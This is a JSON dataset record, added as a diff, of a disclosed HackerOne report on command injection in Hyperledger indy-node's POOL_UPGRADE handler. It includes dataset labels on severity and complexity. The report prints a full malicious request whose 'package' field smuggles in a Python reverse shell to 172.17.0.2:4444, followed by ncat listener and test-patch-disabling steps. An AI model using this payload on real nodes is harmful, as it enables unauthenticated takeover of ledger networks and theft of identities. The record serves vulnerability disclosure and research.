@@ -1,0 +1,49 @@
+{
+  "reported_to": "Hyperledger",
+  "reported_by": "shakedreiner ",
+  "title": "POOL_UPGRADE request handler may allow an unauthenticated attacker to remotely execute code on every node in the network. ",
+  "content": "\nThis issue is related to the https://github.com/hyperledger/indy-node.\nThe issue was found in the indy-node code that handles the write request of type **POOL_UPGRADE (in file indy-node/indy_node/server/request_handlers/config_req_handlers/pool_upgrade_handler.py**).**\nThe additional_dynamic_validation function handles an undocumented field called package that can contain the name of the package to be upgraded. I case that this field is not empty, it is passed as is to the following functions self.upgrader.check_upgrade_possible -> NodeControlUtil.curr_pkg_info -> cls._get_curr_info.\nCode 118 Bytes\n1def _get_curr_info(cls, package):\n2    cmd = compose_cmd(['dpkg', '-s', package])\n3    return cls.run_shell_command(cmd)\nAs seen in the code snippet above, the user supplied name is then concatenated to the string dpkg -s and is run as a system command without any sanitization.\nThis can lead to an attacker supplying a package name, followed by a semicolon and another system command (e.g. package ; whoami), resulting in a remote code execution. This of course can be any command, and in the PoC code attached I\u2019m running a reverse shell, effectively taking control of the node, and possibly the entire network and the identities in it (assuming I run this exploit on enough nodes).\nThe documentation specifies that the POOL_UPGRADE can be run by a Trustee only, however, we can run this exploit being a client without any roles in the network.\nThis is made possible by the fact that the authorization that the POOL_UPGRADE handler performs, happens only after the package information has been fetched (using self.upgrader.check_upgrade_possible). Meaning any client can trigger the vulnerable code path and execute code on all the network\u2019s nodes.\nSteps to reproduce:\nWe\u2019ll provide 2 methods for this, using the testing framework and independently; both are detailed below. The malicious POOL_UPGRADE request looks as follows:\nCode 1.06 KiB\n1{\n2    \"identifier\": \"6ouriXMZkLeHsuXrN1X1fd\",\n3    \"operation\": {\n4        \"action\": \"start\",\n5        \"name\": \"test\",\n6        \"package\": \"a ; python3 -c \\'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\\\"\n7        172.17 .0 .2\\\\ \",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\\\" / bin / sh\\\\ \")\\'\",\n8        \"schedule\": {\n9            \"4yC546FFzorLPgTNTc6V43DnpFrR8uHvtunBxb2Suaa2\": \"2022-12-25T10:25:58.271857+00:00\",\n10            \"AtDfpKFe1RPgcr5nnYBw1Wxkgyn8Zjyh5MzFoEUTeoV3\": \"2022-12-25T10:26:16.271857+00:00\",\n11            \"DG5M4zFm33Shrhjj6JB7nmx9BoNJUq219UXDfvwBDPe2\": \"2022-12-25T10:26:25.271857+00:00\",\n12            \"JpYerf4CssDrH76z7jyQPJLnZ1vwYgvKbvcp16AB5RQ\": \"2022-12-25T10:26:07.271857+00:00\"\n13        },\n14        \"sha256\": \"db34a72a90d026dae49c3b3f0436c8d3963476c77468ad955845a1ccf7b03f55\",\n15        \"type\": \"109\",\n16        \"version\": \"1.1\"\n17    },\n18    \"protocolVersion\": 2,\n19    \"reqId\": 1651152851,\n20    \"signature\": \"4YoXKHNnWRouTUAW4fKuTANnXNJfY2JoPG4PoXfz4PUzjx4NySrAmzkzy6zCiRRf5uczZx5mQVSm1eCZLnUHUDoT\"\n21}\nA few notes on some important fields:\npackage - the undocumented field that leads to the security issue. After the semi-colon we have the injected command. In this case, a Python reverse shell (note that you\u2019ll need to change the IP address and port to point to you)\nschedule - It\u2019s important only because we need it in order to pass the static_validation of this request, just need to set the public nodes and a time in the future.\nsignature - the request should be properly signed by any identity in the network (no role needed)\nRun using pytest:\ncd indy_node/test/\nDrop the exploit_test.py file\nListen for incoming connection on a different machine (e.g. ncat -lvvp 4444)\nFind the following code in the exploit s.connect((\"172.17.0.2\",4444)), and replace the address and port for your ones\nDisable the testing patch that replaces the vulnerable function in testing mode using the following command sed -i '/def patchNodeControlUtil().*:/{n;s/.*/ yield/}' conftest.py\nRun the test and get a reverse shell pytest -s exploit_test.py\nRun independently:\ncd indy_node/test/\nDrop the exploit.py file\nListen for incoming connection on a different machine (e.g. ncat -lvvp 4444)\nFind the following code in the exploit s.connect((\"172.17.0.2\",4444)), and replace the address and port for your ones\nReplace the ADDRESS and PORT with your target node details (the node\u2019s client port)\nReplace the SERVER_KEY with the ZeroMQ CURVE Public Certificate of your target node (it is public info)\nServer key can also be obtained from the genesis file, and converted the same way it\u2019s done here https://github.com/hyperledger/indy-sdk/blob/master/scripts/test_zmq/src/main.rs or in the indy-sdk here scripts/test_zmq/src/main.rs:136\nServer key can also be obtained from the genesis file, and converted the same way it\u2019s done here https://github.com/hyperledger/indy-sdk/blob/master/scripts/test_zmq/src/main.rs or in the indy-sdk here scripts/test_zmq/src/main.rs:136\nRun the test and get a reverse shell\nImpact\nBreaking the network\u2019s consensus, stealing every identity, getting to run code on all of the nodes.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": 2000,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1666310820,
+  "report_url": "https://hackerone.com/reports/1705717",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Identify the undocumented 'package' field in the POOL_UPGRADE request handler in indy-node"
+    ],
+    [
+      2,
+      "Craft a malicious POOL_UPGRADE request with a command injection in the 'package' field"
+    ],
+    [
+      3,
+      "Send the crafted request to a target node to execute arbitrary code"
+    ]
+  ],
+  "vuln_description": "The vulnerability allows an unauthenticated attacker to execute arbitrary code on every node in the network by exploiting a command injection flaw in the POOL_UPGRADE request handler. The handler fails to sanitize user input in the 'package' field, which is then passed to a shell command.",
+  "reason": "The vulnerability involves understanding the POOL_UPGRADE request flow, identifying an undocumented field, and crafting a command injection payload. While the attack chain is straightforward once the field is discovered, the initial discovery of the undocumented field and its misuse requires some insight.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves an unauthenticated attacker being able to execute code on every node in the network by exploiting a flaw in the POOL_UPGRADE request handler. The methodology described focuses on detecting authorization and authentication bypasses within the same application by swapping user sessions and resource IDs. However, this vulnerability is not about bypassing authentication or authorization within the same application context but rather about exploiting a command injection flaw in a specific request handler. The methodology does not cover command injection vulnerabilities or the specific context of this exploit.",
+    "is_detectable": false
+  }
+}
